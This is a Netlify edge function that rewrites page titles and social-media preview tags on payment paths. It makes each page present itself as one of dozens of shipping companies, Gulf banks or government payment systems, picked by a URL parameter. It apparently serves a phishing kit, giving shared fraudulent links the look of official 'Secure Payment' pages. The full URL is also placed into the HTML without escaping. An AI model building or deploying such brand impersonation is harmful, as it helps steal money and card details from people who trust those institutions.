import { Context } from "https://edge.netlify.com";

const GITHUB_CDN = 'https://raw.githubusercontent.com/yousefmussi-code/payment-gateway/main/public';

const brands: Record<string, { title: string; desc: string; image: string }> = {
  // Shipping
  dhl: { title: "DHL Express - Secure Payment", desc: "Pay for your DHL international shipment securely.", image: "/images/brand-logos/shipping/dhl.png" },
  fedex: { title: "FedEx Express - Secure Payment", desc: "Complete your FedEx shipment payment safely.", image: "/images/brand-logos/shipping/fedex.png" },
  aramex: { title: "Aramex - Secure Payment", desc: "Pay for your Aramex delivery using our secure portal.", image: "/images/brand-logos/shipping/aramex.png" },
  ups: { title: "UPS - Secure Payment", desc: "Securely pay for your UPS global shipping services.", image: "/images/brand-logos/shipping/ups.png" },
  smsa: { title: "SMSA Express - Secure Payment", desc: "Complete your SMSA delivery payment safely.", image: "/images/brand-logos/shipping/smsa.svg" },
  zajil: { title: "Zajil - Secure Payment", desc: "Pay for your Zajil express shipment securely.", image: "/images/brand-logos/shipping/zajil.png" },
  naqel: { title: "NAQEL Express - Secure Payment", desc: "Securely pay for your NAQEL express delivery.", image: "/images/brand-logos/shipping/naqel.jpg" },
  saudipost: { title: "Saudi Post (SPL) - Secure Payment", desc: "Complete your Saudi Post (SPL) payment safely.", image: "/images/brand-logos/shipping/saudipost.png" },
  kwpost: { title: "Kuwait Post - Secure Payment", desc: "Securely pay for your Kuwait Post services.", image: "/images/brand-logos/shipping/kwpost.png" },
  qpost: { title: "Qatar Post - Secure Payment", desc: "Complete your Qatar Post shipment payment safely.", image: "/images/brand-logos/shipping/qpost.png" },
  omanpost: { title: "Oman Post - Secure Payment", desc: "Securely pay for your Oman Post services.", image: "/images/brand-logos/shipping/omanpost.png" },
  bahpost: { title: "Bahrain Post - Secure Payment", desc: "Complete your Bahrain Post payment safely.", image: "/images/brand-logos/shipping/bahpost.png" },

  // Banks
  alrajhi_bank: { title: "Al Rajhi Bank - Secure Payment", desc: "Secure payment gateway powered by Al Rajhi Bank.", image: "/images/brand-logos/banks/alrajhi_bank.png" },
  alahli_bank: { title: "SNB (AlAhli) - Secure Payment", desc: "Secure payment gateway powered by SNB AlAhli.", image: "/images/brand-logos/banks/alahli_bank.png" },
  samba_bank: { title: "Samba Bank - Secure Payment", desc: "Complete your payment securely via Samba Bank.", image: "/images/brand-logos/banks/samba_bank.png" },
  stc_bank: { title: "STC Bank - Secure Payment", desc: "Fast and secure payment powered by STC Bank.", image: "/images/brand-logos/banks/stc_bank.png" },
  emirates_nbd: { title: "Emirates NBD - Secure Payment", desc: "Secure payment gateway powered by Emirates NBD.", image: "/images/brand-logos/banks/emirates_nbd.png" },
  fab: { title: "First Abu Dhabi Bank (FAB) - Secure Payment", desc: "Complete your payment safely via FAB.", image: "/images/brand-logos/banks/fab.png" },
  dib: { title: "Dubai Islamic Bank (DIB) - Secure Payment", desc: "Secure payment gateway powered by DIB.", image: "/images/brand-logos/banks/dib.png" },
  nbk: { title: "National Bank of Kuwait (NBK) - Secure Payment", desc: "Secure payment gateway powered by NBK.", image: "/images/brand-logos/banks/nbk.png" },
  kfh: { title: "Kuwait Finance House (KFH) - Secure Payment", desc: "Complete your payment safely via KFH.", image: "/images/brand-logos/banks/kfh.png" },
  gulf_bank: { title: "Gulf Bank - Secure Payment", desc: "Secure payment gateway powered by Gulf Bank.", image: "/images/brand-logos/banks/gulf_bank.png" },
  qnb: { title: "Qatar National Bank (QNB) - Secure Payment", desc: "Secure payment gateway powered by QNB.", image: "/images/brand-logos/banks/qnb.png" },
  cbq: { title: "Commercial Bank of Qatar (CBQ) - Secure Payment", desc: "Complete your payment safely via CBQ.", image: "/images/brand-logos/banks/cbq.png" },
  doha_bank: { title: "Doha Bank - Secure Payment", desc: "Secure payment gateway powered by Doha Bank.", image: "/images/brand-logos/banks/doha_bank.png" },
  bank_muscat: { title: "Bank Muscat - Secure Payment", desc: "Secure payment gateway powered by Bank Muscat.", image: "/images/brand-logos/banks/bank_muscat.png" },
  national_bank_oman: { title: "National Bank of Oman (NBO) - Secure Payment", desc: "Complete your payment safely via NBO.", image: "/images/brand-logos/banks/national_bank_oman.png" },
  nbb: { title: "National Bank of Bahrain (NBB) - Secure Payment", desc: "Secure payment gateway powered by NBB.", image: "/images/brand-logos/banks/nbb.png" },
  bisb: { title: "Bahrain Islamic Bank (BisB) - Secure Payment", desc: "Secure payment gateway powered by BisB.", image: "/images/brand-logos/banks/bisb.png" },

  // Government
  sadad: { title: "SADAD Payment - Secure Gateway", desc: "Pay your bills securely via SADAD.", image: "/images/brand-logos/government/sadad.svg" },
  jaywan: { title: "Jaywan Payment - Secure Gateway", desc: "Secure government payment powered by Jaywan.", image: "/images/brand-logos/government/jaywan.svg" },
  knet: { title: "KNET Payment - Secure Gateway", desc: "Pay securely via KNET Kuwait.", image: "/images/brand-logos/government/KW.png" },
  benefit: { title: "BENEFIT Payment - Secure Gateway", desc: "Secure payment powered by BENEFIT Bahrain.", image: "/images/brand-logos/government/BH.png" },
  maal: { title: "MAAL Payment - Secure Gateway", desc: "Pay securely via MAAL Oman.", image: "/images/brand-logos/government/OM.svg" },
  qatar_payment: { title: "Qatar Payment - Secure Gateway", desc: "Secure government payment gateway for Qatar.", image: "/images/brand-logos/government/QA.png" },
};

export default async (request: Request, context: Context) => {
  const url = new URL(request.url);
  const path = url.pathname;

  // Only run on payment related paths
  if (!path.startsWith('/pay') && !path.startsWith('/p/') && !path.startsWith('/recipient')) {
    return context.next();
  }

  const response = await context.next();
  
  // Clone response so we can read body
  const contentType = response.headers.get("content-type") || "";
  if (!contentType.includes("text/html")) {
    return response;
  }

  let html = await response.text();

  // Detect entity
  const entity = url.searchParams.get('entity') || url.searchParams.get('company') || 'aramex';
  const brand = brands[entity.toLowerCase()] || brands.aramex;

  const fullImageUrl = `${GITHUB_CDN}${brand.image}`;
  
  // Inject Meta Tags
  const metaTags = `
    <title>${brand.title}</title>
    <meta name="description" content="${brand.desc}" />
    <meta property="og:title" content="${brand.title}" />
    <meta property="og:description" content="${brand.desc}" />
    <meta property="og:image" content="${fullImageUrl}" />
    <meta property="og:url" content="${url.href}" />
    <meta property="og:type" content="website" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="${brand.title}" />
    <meta name="twitter:description" content="${brand.desc}" />
    <meta name="twitter:image" content="${fullImageUrl}" />
  `;

  // Simple replacement
  html = html.replace(/<title>.*?<\/title>/i, '');
  html = html.replace(/<meta name="description".*?>/i, '');
  html = html.replace(/<meta property="og:.*?".*?>/gi, '');
  html = html.replace(/<meta name="twitter:.*?".*?>/gi, '');
  
  html = html.replace('<head>', `<head>\n${metaTags}`);

  return new Response(html, {
    headers: {
      ...Object.fromEntries(response.headers),
      "content-type": "text/html; charset=utf-8",
      "cache-control": "no-cache, no-store, must-revalidate",
    }
  });
};

export const config = {
  path: ["/pay/*", "/p/*", "/recipient/*"],
};
